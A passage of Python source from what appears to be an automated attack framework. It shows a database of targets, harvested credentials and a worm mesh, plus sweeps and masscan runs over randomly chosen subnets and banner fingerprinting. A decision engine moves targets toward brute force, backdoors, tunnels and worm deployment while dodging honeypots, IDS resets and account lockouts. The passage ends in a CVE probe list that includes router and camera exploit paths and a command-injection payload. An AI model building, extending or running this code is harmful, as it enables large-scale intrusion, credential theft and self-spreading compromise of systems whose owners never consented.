                icmp_alive INTEGER DEFAULT 0,
                tcp_open INTEGER DEFAULT 1,
                cve_scanned INTEGER DEFAULT 0,
                cve_vulns TEXT DEFAULT '',
                web_pwned INTEGER DEFAULT 0,
                embed_pwned INTEGER DEFAULT 0,
                genzai_merged INTEGER DEFAULT 0,
                enterprise_pwned INTEGER DEFAULT 0,
                brute_pwned INTEGER DEFAULT 0,
                backdoor_installed INTEGER DEFAULT 0,
                tunnel_active INTEGER DEFAULT 0,
                worm_deployed INTEGER DEFAULT 0,
                intel_collected INTEGER DEFAULT 0,
                crossfeed_count INTEGER DEFAULT 0,
                report_generated INTEGER DEFAULT 0,
                UNIQUE(ip, port)
            );
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT, port INTEGER, service TEXT,
                username TEXT, password TEXT,
                source TEXT DEFAULT 'manual',
                first_seen TEXT DEFAULT (datetime('now')),
                last_used TEXT DEFAULT (datetime('now')),
                valid INTEGER DEFAULT 1,
                UNIQUE(ip, port, username, password)
            );
            CREATE TABLE IF NOT EXISTS intel_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT, port INTEGER,
                intel_type TEXT, intel_data TEXT,
                collected_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS worm_mesh (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                node_ip TEXT UNIQUE,
                node_port INTEGER DEFAULT 10001,
                peer_ips TEXT DEFAULT '',
                first_seen TEXT DEFAULT (datetime('now')),
                last_heartbeat TEXT DEFAULT (datetime('now')),
                version TEXT DEFAULT '5.0',
                active INTEGER DEFAULT 1
            );
            CREATE INDEX IF NOT EXISTS idx_targets_ip ON targets(ip);
            CREATE INDEX IF NOT EXISTS idx_creds_ip ON credentials(ip);
            CREATE INDEX IF NOT EXISTS idx_intel_ip ON intel_log(ip);
        """)
        self._conn.commit()

    def q(self, sql: str, params: tuple = ()):
        try:
            cur = self._conn.execute(sql, params)
            rows = cur.fetchall()
            self._conn.commit()
            return [dict(r) for r in rows] if rows else []
        except sqlite3.OperationalError:
            self._connect()
            return []

    def add_target(self, ip: str, port: int, protocol: str = "tcp"):
        self.q("INSERT OR IGNORE INTO targets (ip, port, protocol) VALUES (?, ?, ?)",
               (ip, port, protocol))

    def mark_icmp_alive(self, ip: str, port: int, alive: int = 1):
        self.q("UPDATE targets SET icmp_alive=? WHERE ip=? AND port=?", (alive, ip, port))

    def mark_tcp_open(self, ip: str, port: int, open: int = 1):
        self.q("UPDATE targets SET tcp_open=? WHERE ip=? AND port=?", (open, ip, port))

    def mark_fp(self, ip: str, port: int, fp: Dict):
        self.q("""UPDATE targets SET fp_os=?, fp_banner=?, fp_service=?,
                  fp_ttl=?, fp_http_server=?, icmp_alive=?
                  WHERE ip=? AND port=?""",
               (fp.get("os",""), fp.get("banner",""), fp.get("service",""),
                fp.get("ttl",0), fp.get("http_server",""), fp.get("icmp_alive",0),
                ip, port))

    def mark_cve(self, ip: str, port: int, vulns: str):
        self.q("UPDATE targets SET cve_scanned=1, cve_vulns=? WHERE ip=? AND port=?",
               (vulns, ip, port))

    def mark_pwned(self, ip: str, port: int, field: str, user: str = "", pwd: str = ""):
        safe_fields = ["brute_pwned","web_pwned","embed_pwned","enterprise_pwned",
                       "backdoor_installed","tunnel_active","worm_deployed","intel_collected"]
        if field in safe_fields:
            self.q(f"UPDATE targets SET {field}=1 WHERE ip=? AND port=?", (ip, port))
        if user or pwd:
            svc = SERVICE_NAME.get(port, f"p{port}")
            self.q("""INSERT OR IGNORE INTO credentials (ip, port, service, username, password, source)
                      VALUES (?, ?, ?, ?, ?, ?)""", (ip, port, svc, user, pwd, field))

    def get_targets_by_phase(self, phase: str, limit: int = 200) -> List[Dict]:
        """Get targets ready for a specific phase based on phase prerequisites."""
        if phase == "ICMP":
            return self.q("SELECT * FROM targets WHERE icmp_alive=0 AND tcp_open=0 LIMIT ?", (limit,)) or []
        elif phase == "TCP":
            return self.q("SELECT * FROM targets WHERE icmp_alive=1 AND tcp_open=0 LIMIT ?", (limit,)) or []
        elif phase == "FP":
            return self.q("SELECT * FROM targets WHERE icmp_alive=1 AND tcp_open=1 AND fp_os='' AND fp_banner='' LIMIT ?", (limit,)) or []
        elif phase == "CVE":
            return self.q("SELECT * FROM targets WHERE cve_scanned=0 AND cve_vulns='' AND fp_os!='' LIMIT ?", (limit,)) or []
        elif phase == "WEB":
            return self.q("SELECT * FROM targets WHERE web_pwned=0 AND (fp_service LIKE '%HTTP%' OR fp_service LIKE '%HTTPS%' OR port IN (80,443,8080,8443,3000,5000,7000,8888,9443,9999)) LIMIT ?", (limit,)) or []
        elif phase == "EMBED":
            return self.q("SELECT * FROM targets WHERE embed_pwned=0 AND (port IN (23,7547) OR fp_service LIKE '%Telnet%' OR fp_service LIKE '%TR-069%') LIMIT ?", (limit,)) or []
        elif phase == "GENZAI":
            return self.q("SELECT * FROM targets WHERE genzai_merged=0 LIMIT ?", (limit,)) or []
        elif phase == "ENTERPRISE":
            return self.q("SELECT * FROM targets WHERE enterprise_pwned=0 AND port IN (445,1433,1521,3389) LIMIT ?", (limit,)) or []
        elif phase == "BRUTE":
            return self.q("SELECT * FROM targets WHERE brute_pwned=0 AND (brute_pwned=0 AND web_pwned=0 AND embed_pwned=0 AND enterprise_pwned=0) LIMIT ?", (limit,)) or []
        elif phase == "BACKDOOR":
            return self.q("SELECT * FROM targets WHERE backdoor_installed=0 AND (brute_pwned=1 OR web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1) LIMIT ?", (limit,)) or []
        elif phase == "TUNNEL":
            return self.q("SELECT * FROM targets WHERE tunnel_active=0 AND backdoor_installed=1 LIMIT ?", (limit,)) or []
        elif phase == "WORM":
            return self.q("SELECT * FROM targets WHERE worm_deployed=0 AND backdoor_installed=1 AND tunnel_active=1 LIMIT ?", (limit,)) or []
        elif phase == "INTEL":
            return self.q("SELECT * FROM targets WHERE intel_collected=0 AND worm_deployed=1 LIMIT ?", (limit,)) or []
        elif phase == "CROSSFEED":
            return self.q("SELECT * FROM targets WHERE crossfeed_count=0 AND intel_collected>0 LIMIT ?", (limit,)) or []
        elif phase == "REPORT":
            return self.q("SELECT * FROM targets WHERE report_generated=0 LIMIT ?", (limit,)) or []
        return []

    def stats(self) -> Dict:
        return {
            "targets": self.q("SELECT COUNT(*) as c FROM targets")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets") else 0,
            "icmp_alive": self.q("SELECT COUNT(*) as c FROM targets WHERE icmp_alive=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE icmp_alive=1") else 0,
            "tcp_open": self.q("SELECT COUNT(*) as c FROM targets WHERE tcp_open=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE tcp_open=1") else 0,
            "fp_done": self.q("SELECT COUNT(*) as c FROM targets WHERE fp_os!=''")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE fp_os!=''") else 0,
            "cve_found": self.q("SELECT COUNT(*) as c FROM targets WHERE cve_vulns!=''")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE cve_vulns!=''") else 0,
            "web_pwned": self.q("SELECT COUNT(*) as c FROM targets WHERE web_pwned=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE web_pwned=1") else 0,
            "embed_pwned": self.q("SELECT COUNT(*) as c FROM targets WHERE embed_pwned=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE embed_pwned=1") else 0,
            "enterprise_pwned": self.q("SELECT COUNT(*) as c FROM targets WHERE enterprise_pwned=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE enterprise_pwned=1") else 0,
            "brute_pwned": self.q("SELECT COUNT(*) as c FROM targets WHERE brute_pwned=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE brute_pwned=1") else 0,
            "backdoor_installed": self.q("SELECT COUNT(*) as c FROM targets WHERE backdoor_installed=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE backdoor_installed=1") else 0,
            "tunnel_active": self.q("SELECT COUNT(*) as c FROM targets WHERE tunnel_active=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE tunnel_active=1") else 0,
            "worm_deployed": self.q("SELECT COUNT(*) as c FROM targets WHERE worm_deployed=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE worm_deployed=1") else 0,
            "intel_collected": self.q("SELECT COUNT(*) as c FROM targets WHERE intel_collected>0")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE intel_collected>0") else 0,
            "credentials": self.q("SELECT COUNT(*) as c FROM credentials")[0]["c"] if self.q("SELECT COUNT(*) as c FROM credentials") else 0,
        }


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: ICMP SWEEP
# ═══════════════════════════════════════════════════════════════════════════════

def phase_icmp_sweep(db: KillchainDB, subnets: int = 3, hosts_per_subnet: int = 7) -> Dict:
    """ICMP ping sweep — Phase 1."""
    log.info("📡 PHASE 1: ICMP SWEEP — scanning for alive hosts")
    results = []
    targets = []

    # Select subnets
    selected_subnets = []
    for _ in range(subnets):
        subnet = SPIDER_SUBNETS[random.randint(0, len(SPIDER_SUBNETS)-1)]
        selected_subnets.append(subnet)
        base = subnet.split("/")[0]
        parts = base.split(".")
        # Ping .1 (gateway) and random hosts
        for h in [1, 254] + [random.randint(2, 253) for _ in range(hosts_per_subnet - 2)]:
            parts[-1] = str(h)
            targets.append(".".join(parts))

    def _ping(ip: str) -> Optional[Dict]:
        try:
            start = time.time()
            r = subprocess.run(
                ["ping", "-c1", "-W2", ip],
                capture_output=True, timeout=3, text=True
            )
            rtt = (time.time() - start) * 1000
            if r.returncode == 0:
                ttl = 64
                ttl_m = re.search(r'ttl[=:](\d+)', r.stdout, re.I)
                if ttl_m:
                    ttl = int(ttl_m.group(1))
                return {"ip": ip, "ttl": ttl, "rtt": round(rtt, 1)}
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        for res in pool.map(_ping, targets):
            if res:
                results.append(res)

    # Deduplicate
    seen = set()
    deduped = []
    for r in results:
        if r["ip"] not in seen:
            seen.add(r["ip"])
            deduped.append(r)
            db.add_target(r["ip"], 0)  # port 0 means no port yet
            db.mark_icmp_alive(r["ip"], 0, 1)

    count = len(deduped)
    log.info(f"📡 ICMP: {count} alive hosts")
    return {"count": count, "targets": deduped, "success": count > 0}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: TCP PORT SCAN
# ═══════════════════════════════════════════════════════════════════════════════

def phase_tcp_scan(db: KillchainDB, subnets: int = 3) -> Dict:
    """TCP port scan via masscan or socket fallback — Phase 2."""
    log.info("🔍 PHASE 2: TCP SCAN — masscan port sweep")
    results = []

    # Get ICMP-alive targets first
    icmp_targets = db.q("SELECT ip FROM targets WHERE icmp_alive=1 AND tcp_open=0 LIMIT 100")
    if not icmp_targets:
        # Fallback: scan random subnets
        log.info("🔍 No ICMP targets, using masscan on random subnets")
        subnets_to_scan = []
        for _ in range(subnets):
            subnets_to_scan.append(SPIDER_SUBNETS[random.randint(0, len(SPIDER_SUBNETS)-1)])
        return _masscan_scan(db, subnets_to_scan)

    # Scan ports on ICMP-alive targets using socket connect
    ports = [int(p) for p in MASSCAN_PORTS.split(",") if p.strip()]
    scan_targets = []
    for t in icmp_targets:
        ip = t["ip"]
        for port in ports[:20]:  # Top 20 ports for speed
            scan_targets.append((ip, port))

    def _check(ip: str, port: int) -> Optional[Dict]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((ip, port))
            s.close()
            if result == 0:
                svc = SERVICE_NAME.get(port, f"p{port}")
                return {"ip": ip, "port": port, "protocol": "tcp", "service_name": svc}
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as pool:
        fut_map = {pool.submit(_check, ip, port): (ip, port) for ip, port in scan_targets}
        for fut in concurrent.futures.as_completed(fut_map):
            res = fut.result()
            if res:
                results.append(res)
                db.add_target(res["ip"], res["port"])
                db.mark_tcp_open(res["ip"], res["port"], 1)

    count = len(results)
    log.info(f"🔍 TCP: {count} open ports found")
    return {"count": count, "targets": results, "success": count > 0}


def _masscan_scan(db: KillchainDB, subnets: List[str]) -> Dict:
    """Masscan-based TCP scanning fallback."""
    results = []
    subnet_str = " ".join(subnets)
    try:
        masscan_bin = shutil.which("masscan") or "/usr/bin/masscan"
        cmd = [
            masscan_bin, "-p", MASSCAN_PORTS,
            "--rate", str(MASSCAN_RATE),
            "--wait", "3",
            "--output-format", "json",
            "--output-filename", "-",
        ] + subnets
        r = subprocess.run(cmd, capture_output=True, timeout=90, text=True)
        if r.returncode == 0 or r.stdout:
            for line in r.stdout.strip().split("\n"):
                if not line.strip():
                    continue
                try:
                    data = json.loads(line)
                    ip = data.get("ip", "")
                    port = data.get("ports", [{}])[0].get("port", 0) if isinstance(data.get("ports"), list) and data["ports"] else data.get("port", 0)
                    if ip and port:
                        svc = SERVICE_NAME.get(int(port), f"p{port}")
                        results.append({"ip": ip, "port": int(port), "service_name": svc})
                        db.add_target(ip, int(port))
                        db.mark_tcp_open(ip, int(port), 1)
                except (json.JSONDecodeError, IndexError):
                    continue
    except Exception as e:
        log.warning(f"Masscan error: {e}")
    count = len(results)
    log.info(f"🔍 TCP (masscan): {count} open ports")
    return {"count": count, "targets": results, "success": count > 0}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: FINGERPRINTING
# ═══════════════════════════════════════════════════════════════════════════════

def phase_fingerprint(db: KillchainDB) -> Dict:
    """Banner grab, HTTP fingerprint, TTL detection — Phase 3."""
    log.info("🖥️ PHASE 3: FINGERPRINTING — banner/OS/TTL detect")
    count = 0

    targets = db.q("SELECT * FROM targets WHERE tcp_open=1 AND fp_os='' AND fp_banner='' LIMIT 150")
    if not targets:
        log.info("🖥️ No targets to fingerprint")
        return {"count": 0, "success": False, "targets": []}

    def _fp(target: Dict) -> Optional[Dict]:
        ip = target["ip"]
        port = int(target["port"])
        fp_info = {"os": "", "banner": "", "service": "", "ttl": 0, "http_server": "", "icmp_alive": 0}

        # TTL from ping
        try:
            r = subprocess.run(["ping", "-c1", "-W2", "-n", ip], capture_output=True, timeout=3, text=True)
            if r.returncode == 0:
                fp_info["icmp_alive"] = 1
                ttl_m = re.search(r'ttl[=:](\d+)', r.stdout, re.I)
                if ttl_m:
                    fp_info["ttl"] = int(ttl_m.group(1))
                    ttl = fp_info["ttl"]
                    if ttl <= 64: fp_info["os"] = "Linux/Unix"
                    elif ttl <= 128: fp_info["os"] = "Windows"
                    elif ttl <= 255: fp_info["os"] = "Cisco/Network"
        except Exception:
            pass

        # Banner grab via socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
                s.sendall(b"GET / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
            elif port == 22:
                pass
            elif port == 23:
                s.sendall(b"\r\n")
            elif port in (3306, 6379, 5432):
                s.sendall(b"\x00")
            banner = b""
            try:
                banner = s.recv(1024)
            except socket.timeout:
                pass
            if banner:
                try:
                    decoded = banner.decode("utf-8", errors="replace")
                except Exception:
                    decoded = repr(banner[:200])
                fp_info["banner"] = decoded[:500].replace("\n", " ").replace("\r", "").strip()
                if port == 22 and "SSH" in decoded:
                    fp_info["service"] = "SSH"
                elif port in (80,443,8080,8443) and decoded.startswith("HTTP"):
                    fp_info["service"] = "HTTP"
                    m = re.search(r'Server:\s*([^\r\n]+)', decoded, re.I)
                    if m: fp_info["http_server"] = m.group(1).strip()
            s.close()
        except Exception:
            pass

        # HTTP header grab for web ports
        if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                scheme = "https" if port in (443, 8443, 9443) else "http"
                req = urllib.request.Request(f"{scheme}://{ip}:{port}/")
                with urllib.request.urlopen(req, timeout=4, context=ctx) as resp:
                    server = resp.headers.get("Server", "")
                    if server: fp_info["http_server"] = server
                    if not fp_info.get("banner"):
                        fp_info["banner"] = f"HTTP {resp.status} {resp.reason}"
            except Exception:
                pass

        db.mark_fp(ip, port, fp_info)
        return {"ip": ip, "port": port, "fp": fp_info}

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
        for res in pool.map(_fp, targets):
            if res:
                count += 1

    log.info(f"🖥️ FP: {count}/{len(targets)} fingerprinted")
    return {"count": count, "success": count > 0, "targets": targets[:count]}

def phase_fp_scan_v2(db: KillchainDB, decision_engine: "Optional[DecisionEngine16]" = None, **extra) -> Dict:
    """Upgraded fingerprinting with honeypot detection — Phase 3."""
    log.info("🖥️ PHASE 3v2: FINGERPRINT + HONEYPOT DETECT")
    result = phase_fingerprint(db, **extra)
    if decision_engine:
        # Pass each target's banner through honeypot detector
        for t in result.get("targets", []):
            banner = t.get("fp", {}).get("banner", "")
            ip = t.get("ip", "")
            if banner and decision_engine.is_honeypot_banner(banner):
                decision_engine.report_honeypot(ip, f"banner: {banner[:60]}")
                log.warning(f"🐝 Honeypot detected by banner: {ip} ({banner[:60]})")
    return result


# ═══════════════════════════════════════════════════════════════════════════════
# DECISION ENGINE — IF/THEN for all 16 phases
# ═══════════════════════════════════════════════════════════════════════════════

HONEYPOT_SIGNATURES = [
    # Cowrie (SSH)
    "cowrie", "CowrieSSH", "SSH-2.0-", "protocol mismatch",
    # Dionaea
    "dionaea", "Dionaea", "python-", "smb", "epmapper",
    # Kippo
    "kippo", "Kippo", "kippoSSH",
    # Conpot
    "conpot", "modbus", "s7comm", "bacnet",
    # Glastopf / web honeypots
    "glastopf", "snare", "tanner",
    # General
    "honeypot", "honeynet", "sandbox", "honeypot",
    "honeyd", "nepenthes",
    # Tarpits
    "tarpit", "slowloris", "endless",
]
SUBNET_BLACKLIST_TIME = 86400  # 24h blacklist for dead subnets
LOCKOUT_THRESHOLD = 10         # consecutive fails before slow-drip
LOCKOUT_COOLDOWN = 600         # 10min slow-drip window
RST_COOLDOWN = 300             # 5min wait after connection reset
HONEYPOT_PORT_THRESHOLD = 50   # >50 open ports = honeypot

class DecisionEngine16:
    """IF/THEN decision engine for 16-phase pipeline."""

    def __init__(self):
        self.hit_streak = 0
        self.empty_streak = 0
        self.phase_counts = {p: 0 for p in PHASES_16}
        self.last_decision = "INIT"
        self._phase_transitions = {}  # Keeps last transition per phase: "phase" -> "next_phase"
        self.phase_index = 0
        # NEW: Smart upgrade state
        self._subnet_dead_zones = {}       # subnet_prefix: expiry_unix
        self._honeypot_ips = set()         # confirmed honeypot IPs
        self._lockout_subnets = {}         # subnet: (fail_count, cooldown_until)
        self._rst_throttled = {}           # ip: cooldown_until
        self._latency_samples = []         # rolling avg latency
        self._latency_window_size = 10
        self._stealth_mode = False          # set by --stealth flag or Telegram bot
        self._alert_cooldown = 0.0          # last critical alert time

    # ─── SMART UPGRADE: Honeypot detection ───────────────────────────────────────
    def is_honeypot_banner(self, banner: str) -> bool:
        """Check if a service banner matches known honeypot signatures."""
        banner_lower = banner.lower()
        for sig in HONEYPOT_SIGNATURES:
            if sig.lower() in banner_lower:
                return True
        return False

    def is_honeypot_port_count(self, open_ports: int) -> bool:
        """Mark as honeypot if suspiciously many ports are open."""
        return open_ports > HONEYPOT_PORT_THRESHOLD

    def is_honeypot_ip(self, ip: str) -> bool:
        """Check if IP is in the honeypot blocklist."""
        return ip in self._honeypot_ips

    def report_honeypot(self, ip: str, reason: str) -> None:
        """Blacklist a confirmed honeypot IP and log it."""
        self._honeypot_ips.add(ip)
        self.last_decision = f"HONEYPOT: {ip} ({reason}) → SKIP"

    # ─── SMART UPGRADE: Subnet dead zones ────────────────────────────────────────
    def _subnet_of(self, ip: str) -> str:
        """Extract /24 prefix from an IP."""
        parts = ip.split(".")
        if len(parts) == 4:
            return ".".join(parts[:3]) + ".0/24"
        return ip

    def mark_subnet_dead(self, ip: str) -> None:
        """Mark a /24 as dead for 24h after 3 empty ICMP sweeps."""
        subnet = self._subnet_of(ip)
        self._subnet_dead_zones[subnet] = time.time() + SUBNET_BLACKLIST_TIME
        self.last_decision = f"DEAD ZONE: {subnet} → blacklisted 24h"

    def is_subnet_dead(self, ip: str) -> bool:
        """Check if IP's /24 is in the dead zone blacklist."""
        subnet = self._subnet_of(ip)
        expiry = self._subnet_dead_zones.get(subnet, 0)
        if expiry == 0:
            return False
        if time.time() > expiry:
            del self._subnet_dead_zones[subnet]
            return False
        return True

    # ─── SMART UPGRADE: Latency monitoring ───────────────────────────────────────
    def record_latency(self, rtt_ms: float) -> None:
        """Record a round-trip latency sample for adaptive thread throttling."""
        self._latency_samples.append(rtt_ms)
        if len(self._latency_samples) > self._latency_window_size:
            self._latency_samples.pop(0)

    def avg_latency(self) -> float:
        """Return average latency over the window, or 0 if no samples."""
        if not self._latency_samples:
            return 0.0
        return sum(self._latency_samples) / len(self._latency_samples)

    def latency_thread_factor(self) -> float:
        """Return thread multiplier based on average latency.
           >500ms → 0.5 (halve threads), >200ms → 0.8, else 1.0"""
        avg = self.avg_latency()
        if avg > 500:
            return 0.5
        elif avg > 200:
            return 0.8
        return 1.0

    # ─── SMART UPGRADE: IDS/RST detection ────────────────────────────────────────
    def record_rst(self, ip: str) -> None:
        """Record a connection reset event — throttle target for 5min."""
        self._rst_throttled[ip] = time.time() + RST_COOLDOWN

    def is_rst_throttled(self, ip: str) -> bool:
        """Check if IP is still in RST cooldown."""
        expiry = self._rst_throttled.get(ip, 0)
        if expiry == 0:
            return False
        if time.time() > expiry:
            del self._rst_throttled[ip]
            return False
        return True

    # ─── SMART UPGRADE: Account lockout detection ────────────────────────────────
    def record_fail(self, ip: str) -> bool:
        """Increment fail counter for this subnet. Returns True if lockout engaged."""
        subnet = self._subnet_of(ip)
        now = time.time()
        fails, cooldown = self._lockout_subnets.get(subnet, (0, 0))
        if now < cooldown:
            return True  # still in slow-drip
        fails += 1
        if fails >= LOCKOUT_THRESHOLD:
            self._lockout_subnets[subnet] = (0, now + LOCKOUT_COOLDOWN)
            self.last_decision = f"LOCKOUT: {subnet} → slow-drip {LOCKOUT_COOLDOWN}s"
            return True
        else:
            self._lockout_subnets[subnet] = (fails, 0)
            return False

    def reset_fail_counter(self, ip: str) -> None:
        """Reset fail counter on successful auth."""
        subnet = self._subnet_of(ip)
        self._lockout_subnets.pop(subnet, None)

    # ─── SMART UPGRADE: OS-aware filtering ──────────────────────────────────────
    def os_matches_exploit(self, fp_os: str, exploit_type: str) -> bool:
        """Return True if the OS tag is compatible with the exploit type."""
        os_lower = fp_os.lower()
        if exploit_type in ("linux_exploit", "iot_exploit"):
            return not ("windows" in os_lower)
        elif exploit_type == "windows_exploit":
            return "windows" in os_lower
        elif exploit_type == "network_exploit":
            return "cisco" in os_lower or "network" in os_lower
        return True  # universal exploit

    # ─── SMART UPGRADE: Pwnability scoring ──────────────────────────────────────
    def pwnability_score(self, target: Dict) -> float:
        """Score a target 0.0-1.0 for how likely it is to be pwnable.
        Higher = more likely. Factors: open ports, OS age, matching creds, banners."""
        score = 0.5  # baseline
        # +0.2 for fingerprint done
        if target.get("fp_os"):
            score += 0.2
        # +0.1 for each known exploit port
        known_ports = {23, 80, 443, 502, 161, 8080, 8443, 7547, 37215, 47808}
        port = target.get("port", 0)
        if port in known_ports:
            score += 0.15
        # +0.1 for open TCP
        if target.get("tcp_open"):
            score += 0.1
        # -0.3 for known honeypot
        ip = target.get("ip", "")
        if ip in self._honeypot_ips:
            score -= 0.3
        # -0.2 for dead subnet
        if self.is_subnet_dead(ip):
            score -= 0.2
        return max(0.0, min(1.0, score))

    def prioritize_targets(self, targets: List[Dict], top_n: int = 50) -> List[Dict]:
        """Sort targets by pwnability score descending, return top N."""
        scored = [(self.pwnability_score(t), t) for t in targets]
        scored.sort(key=lambda x: x[0], reverse=True)
        return [t for _, t in scored[:top_n]]

    # ─── SMART UPGRADE: Stealth mode ─────────────────────────────────────────────
    def set_stealth(self, enabled: bool = True) -> None:
        self._stealth_mode = enabled

    # ─── SMART UPGRADE: Critical alert bypass ────────────────────────────────────
    def critical_alert(self, reporter, message: str) -> None:
        """Bypass all batching and send a critical alert immediately.
        Rate-limited to once per 30s per target to avoid spam."""
        now = time.time()
        if now - self._alert_cooldown < 30:
            return
        self._alert_cooldown = now
        if reporter:
            try:
                reporter._send(f"⚡ <b>CRITICAL</b> {message}")
            except Exception:
                pass

    def decide(self, phase: str, result: Dict) -> str:
        count = result.get("count", 0)
        success = result.get("success", False)

        if count > 0 or success:
            self.hit_streak += 1
            self.empty_streak = 0
        else:
            self.empty_streak += 1
            self.hit_streak = 0

        self.phase_counts[phase] = self.phase_counts.get(phase, 0) + 1

        # IF/THEN rules per phase
        if phase == "ICMP":
            if count > 0:
                self.last_decision = f"ICMP: {count} alive → TCP"
                return "TCP"
            else:
                self.last_decision = "ICMP: empty → RETRY ICMP"
                return "ICMP"

        elif phase == "TCP":
            if count > 0:
                self.last_decision = f"TCP: {count} open → FP"
                return "FP"
            elif self.empty_streak >= 2:
                self.last_decision = f"TCP: {self.empty_streak}x empty → ICMP rotate"
                return "ICMP"
            else:
                self.last_decision = "TCP: empty → RETRY TCP"
                return "TCP"

        elif phase == "FP":
            if count > 0:
                self.last_decision = f"FP: {count} done → CVE"
                return "CVE"
            else:
                self.last_decision = "FP: skip → CVE"
                return "CVE"

        elif phase == "CVE":
            if count > 0:
                self.last_decision = f"CVE: {count} found → WEB"
                return "WEB"
            elif self.empty_streak > 2:
                # Multiple CVE misses — rotate to WEB with fresh targets
                self.last_decision = f"CVE: {self.empty_streak}x miss → WEB"
                return "WEB"
            else:
                # Retry CVE with different targets
                self.last_decision = "CVE: none → RETRY CVE"
                return "CVE"

        elif phase == "WEB":
            if count > 0:
                self.last_decision = f"WEB: {count} pwned → EMBED"
                return "EMBED"
            else:
                self.last_decision = "WEB: none → EMBED"
                return "EMBED"

        elif phase == "EMBED":
            if count > 0:
                self.last_decision = f"EMBED: {count} pwned → GENZAI"
                return "GENZAI"
            else:
                self.last_decision = "EMBED: none → GENZAI"
                return "GENZAI"

        elif phase == "GENZAI":
            if count > 0:
                self.last_decision = f"GENZAI: {count} merged → ENTERPRISE"
                return "ENTERPRISE"
            else:
                self.last_decision = "GENZAI: skip → ENTERPRISE"
                return "ENTERPRISE"

        elif phase == "ENTERPRISE":
            if count > 0:
                self.last_decision = f"ENTERPRISE: {count} pwned → BRUTE"
                return "BRUTE"
            else:
                self.last_decision = "ENTERPRISE: none → BRUTE"
                return "BRUTE"

        elif phase == "BRUTE":
            if count > 0:
                self.last_decision = f"BRUTE: {count} pwned → BACKDOOR"
                return "BACKDOOR"
            else:
                self.last_decision = "BRUTE: none → BACKDOOR"
                return "BACKDOOR"

        elif phase == "BACKDOOR":
            if count > 0:
                self.last_decision = f"BACKDOOR: {count} installed → TUNNEL"
                return "TUNNEL"
            else:
                self.last_decision = "BACKDOOR: none → TUNNEL"
                return "TUNNEL"

        elif phase == "TUNNEL":
            if count > 0:
                self.last_decision = f"TUNNEL: {count} active → WORM"
                return "WORM"
            else:
                self.last_decision = "TUNNEL: none → WORM"
                return "WORM"

        elif phase == "WORM":
            if count > 0:
                self.last_decision = f"WORM: {count} deployed → INTEL"
                return "INTEL"
            else:
                self.last_decision = "WORM: none → INTEL"
                return "INTEL"

        elif phase == "INTEL":
            if count > 0:
                self.last_decision = f"INTEL: {count} logs → SLEEP"
                return "SLEEP"
            else:
                self.last_decision = "INTEL: none → SLEEP"
                return "SLEEP"

        elif phase == "SLEEP":
            self.last_decision = f"SLEEP: hit_streak={self.hit_streak}, empty_streak={self.empty_streak} → CROSSFEED"
            return "CROSSFEED"

        elif phase == "CROSSFEED":
            if count > 0:
                self.last_decision = f"CROSSFEED: {count} ops → REPORT"
                return "REPORT"
            else:
                self.last_decision = "CROSSFEED: none → REPORT"
                return "REPORT"

        elif phase == "REPORT":
            self.last_decision = "REPORT: done → ICMP (loop)"
            return "ICMP"

        # Fallback
        self.last_decision = f"UNKNOWN {phase} → ICMP"
        return "ICMP"

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4: CVE SCAN
# ═══════════════════════════════════════════════════════════════════════════════

def phase_cve_scan(db: KillchainDB) -> Dict:
    """CVE fingerprint scan — Phase 4."""
    log.info("🧨 PHASE 4: CVE SCAN — probing for known vulnerabilities")
    
    # CVE database
    CVE_DB = [
        {"cve": "CVE-2018-10561", "ports": [80, 8080], "check_path": "/GponForm/diag_Form?images/", "check_code": 200, "check_body": ["diag", "GponForm"]},
        {"cve": "CVE-2018-10562", "ports": [80, 8080], "check_path": "/images/", "check_code": 200, "check_body": ["PNG", "JFIF"]},
        {"cve": "CVE-2017-17215", "ports": [37215, 7547], "check_path": "/ctrlt/DeviceUpgrade_1", "check_code": 200, "check_body": ["upgrade", "DeviceUpgrade"]},
        {"cve": "CVE-2014-8361", "ports": [80, 8080], "check_path": "/diagnostic.php", "check_code": 200, "check_body": ["diagnostic", "ping"]},
        {"cve": "CVE-2021-36260", "ports": [80, 443, 8080], "check_path": "/Security/users?auth=YWRtaW46MTEK", "check_code": 200, "check_body": ["user", "admin"]},
        {"cve": "CVE-2026-0001", "ports": [7547, 23], "check_banner": ["TR-069", "CPE", "ACS", "tr69"]},
        {"cve": "CVE-2026-0002", "ports": [23, 7547, 80], "cmd_payload": "; ping -c1 127.0.0.1;"},
